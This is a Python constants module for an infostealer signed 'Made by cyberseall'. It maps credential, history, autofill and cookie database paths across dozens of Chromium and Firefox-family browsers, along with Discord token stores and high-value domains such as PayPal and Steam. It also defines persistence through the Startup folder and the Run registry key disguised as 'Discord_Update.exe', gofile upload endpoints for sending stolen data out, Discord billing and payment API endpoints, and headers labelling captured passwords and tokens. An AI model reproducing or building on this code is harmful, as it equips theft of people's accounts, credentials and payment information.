import os

BROWSER_PATHS = {
    "Chrome": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Chrome Profile 1": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "login_db": "\\Profile 1\\Login Data",
        "history_db": "\\Profile 1\\History",
        "autofill_db": "\\Profile 1\\Web Data"
    },
    "Chrome Profile 2": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "login_db": "\\Profile 2\\Login Data",
        "history_db": "\\Profile 2\\History",
        "autofill_db": "\\Profile 2\\Web Data"
    },
    "Chrome Profile 3": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "login_db": "\\Profile 3\\Login Data",
        "history_db": "\\Profile 3\\History",
        "autofill_db": "\\Profile 3\\Web Data"
    },
    "Chrome Beta": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Chrome SxS (Canary)": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Chrome Dev": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    
    "Edge": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Edge Profile 1": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "login_db": "\\Profile 1\\Login Data",
        "history_db": "\\Profile 1\\History",
        "autofill_db": "\\Profile 1\\Web Data"
    },
    "Edge Profile 2": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "login_db": "\\Profile 2\\Login Data",
        "history_db": "\\Profile 2\\History",
        "autofill_db": "\\Profile 2\\Web Data"
    },
    "Edge Beta": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Edge Dev": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Edge Canary": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Canary", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    
    "Brave": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Brave Profile 1": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "login_db": "\\Profile 1\\Login Data",
        "history_db": "\\Profile 1\\History",
        "autofill_db": "\\Profile 1\\Web Data"
    },
    "Brave Profile 2": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "login_db": "\\Profile 2\\Login Data",
        "history_db": "\\Profile 2\\History",
        "autofill_db": "\\Profile 2\\Web Data"
    },
    "Brave Beta": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Brave Nightly": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    
    "Opera": {
        "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "login_db": "\\Login Data",
        "history_db": "\\History",
        "autofill_db": "\\Web Data"
    },
    "Opera GX": {
        "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        "login_db": "\\Login Data",
        "history_db": "\\History",
        "autofill_db": "\\Web Data"
    },
    "Opera Neon": {
        "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Neon", "User Data", "Default"),
        "login_db": "\\Login Data",
        "history_db": "\\History",
        "autofill_db": "\\Web Data"
    },
    "Opera Beta": {
        "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Beta"),
        "login_db": "\\Login Data",
        "history_db": "\\History",
        "autofill_db": "\\Web Data"
    },
    "Opera Developer": {
        "profile_path": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer"),
        "login_db": "\\Login Data",
        "history_db": "\\History",
        "autofill_db": "\\Web Data"
    },
    
    "Vivaldi": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Vivaldi Profile 1": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
        "login_db": "\\Profile 1\\Login Data",
        "history_db": "\\Profile 1\\History",
        "autofill_db": "\\Profile 1\\Web Data"
    },
    "Vivaldi Snapshot": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi Snapshot", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    
    "Yandex": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Yandex Profile 1": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
        "login_db": "\\Profile 1\\Login Data",
        "history_db": "\\Profile 1\\History",
        "autofill_db": "\\Profile 1\\Web Data"
    },
    
    "Chromium": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Comodo Dragon": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Epic Privacy Browser": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Amigo": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Torch": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Torch", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "CentBrowser": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "7Star": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Sputnik": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Kometa": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Kometa", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Orbitum": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Orbitum", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Iridium": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Iridium", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Uran": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Maxthon": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Maxthon", "Application", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Slimjet": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Avast Secure Browser": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "AVAST Software", "Browser", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "AVG Browser": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "AVG", "Browser", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Chedot": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Chedot", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Blisk": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Blisk", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Kinza": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Kinza", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Coccoc": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    },
    "Atom": {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Atom", "User Data"),
        "login_db": "\\Default\\Login Data",
        "history_db": "\\Default\\History",
        "autofill_db": "\\Default\\Web Data"
    }
}

for i in range(4, 10):
    BROWSER_PATHS[f"Chrome Profile {i}"] = {
        "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "login_db": f"\\Profile {i}\\Login Data",
        "history_db": f"\\Profile {i}\\History",
        "autofill_db": f"\\Profile {i}\\Web Data"
    }

FIREFOX_INSTALLATIONS = {
    "Firefox": os.path.join(os.getenv("PROGRAMFILES"), "Mozilla Firefox"),
    "Firefox (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Mozilla Firefox"),
    "Firefox Developer": os.path.join(os.getenv("PROGRAMFILES"), "Firefox Developer Edition"),
    "Firefox Developer (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Firefox Developer Edition"),
    "Firefox Nightly": os.path.join(os.getenv("PROGRAMFILES"), "Firefox Nightly"),
    "Firefox Nightly (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Firefox Nightly")
}

FIREFOX_PROFILE_LOCATIONS = {
    "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
    "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition", "Profiles"),
    "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly", "Profiles"),
    "Waterfox": os.path.join(os.getenv("APPDATA"), "Waterfox", "Profiles"),
    "Pale Moon": os.path.join(os.getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles"),
    "SeaMonkey": os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles"),
    "Thunderbird": os.path.join(os.getenv("APPDATA"), "Thunderbird", "Profiles"),
    "Basilisk": os.path.join(os.getenv("APPDATA"), "Basilisk", "Profiles"),
    "LibreWolf": os.path.join(os.getenv("APPDATA"), "LibreWolf", "Profiles")
}

DISCORD_PATHS = {
    'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
    'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
    'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
    'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
}

TOKEN_PATHS = {
    'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
    'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
    'Lightcord': os.path.join(os.getenv('APPDATA'), 'Lightcord'),
    'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
    'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
    'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
    'Amigo': os.path.join(os.getenv('LOCALAPPDATA'), 'Amigo', 'User Data'),
    'Torch': os.path.join(os.getenv('LOCALAPPDATA'), 'Torch', 'User Data'),
    'Kometa': os.path.join(os.getenv('LOCALAPPDATA'), 'Kometa', 'User Data'),
    'Orbitum': os.path.join(os.getenv('LOCALAPPDATA'), 'Orbitum', 'User Data'),
    'CentBrowser': os.path.join(os.getenv('LOCALAPPDATA'), 'CentBrowser', 'User Data'),
    '7Star': os.path.join(os.getenv('LOCALAPPDATA'), '7Star', '7Star', 'User Data'),
    'Sputnik': os.path.join(os.getenv('LOCALAPPDATA'), 'Sputnik', 'Sputnik', 'User Data'),
    'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default'),
    'Chrome SxS': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data'),
    'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
    'Epic Privacy Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'Epic Privacy Browser', 'User Data'),
    'Microsoft Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
    'Uran': os.path.join(os.getenv('LOCALAPPDATA'), 'uCozMedia', 'Uran', 'User Data', 'Default'),
    'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
    'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Iridium': os.path.join(os.getenv('LOCALAPPDATA'), 'Iridium', 'User Data', 'Default')
}

COOKIE_BROWSER_PATHS = {
    'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
    'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
    'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
    'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
    'Opera GX': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
    'Vivaldi': os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
}

IMPORTANT_DOMAINS = ["discord", "google", "paypal", "amazon", "steam", "github", "roblox"]

STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
STARTUP_FILENAME = 'Discord_Update.exe'
REGISTRY_KEY_PATH = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
REGISTRY_VALUE_NAME = 'Discord_Update'

STORAGE_PATH = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
CONFIG_FILE = os.path.join(STORAGE_PATH, 'config.json')

TEMP_DATA_FOLDER = os.path.join(os.getenv("APPDATA"), "TempData")

GOFILE_UPLOAD_URL = 'https://upload.gofile.io/uploadfile'
GOFILE_CREATE_FOLDER_URL = 'https://api.gofile.io/contents/createFolder'

IP_API_URL = "https://api.ipify.org"
GEOLOCATION_API_URL = "http://ip-api.com/json/"

DISCORD_API_BASE = "https://discordapp.com/api/v6"
DISCORD_USER_ENDPOINT = f"{DISCORD_API_BASE}/users/@me"
DISCORD_BILLING_ENDPOINT = f"{DISCORD_API_BASE}/users/@me/billing/subscriptions"
DISCORD_PAYMENT_ENDPOINT = f"{DISCORD_API_BASE}/users/@me/billing/payment-sources"

SCREENSHOT_MAX_WIDTH = 1280
SCREENSHOT_QUALITY = 85

HISTORY_LIMIT = 1000
AUTOFILL_FORM_LIMIT = 50
COOKIES_PER_DOMAIN_LIMIT = 20

WEBHOOK_TIMEOUT = 10
UPLOAD_TIMEOUT = 30
API_TIMEOUT = 5

WATERMARK_TEXT = "Made by cyberseall"

FILE_HEADERS = {
    "passwords": "BROWSER PASSWORDS CAPTURED",
    "history": "BROWSER HISTORY CAPTURED", 
    "autofills": "BROWSER AUTOFILLS CAPTURED",
    "cookies": "BROWSER COOKIES CAPTURED",
    "system_info": "SYSTEM INFORMATION CAPTURED",
    "discord_tokens": "DISCORD TOKENS CAPTURED"
}

SEPARATOR_LINE = "==============================================================================="
SUBSECTION_LINE = "-------------------------------------------------------------------------------" 
# update
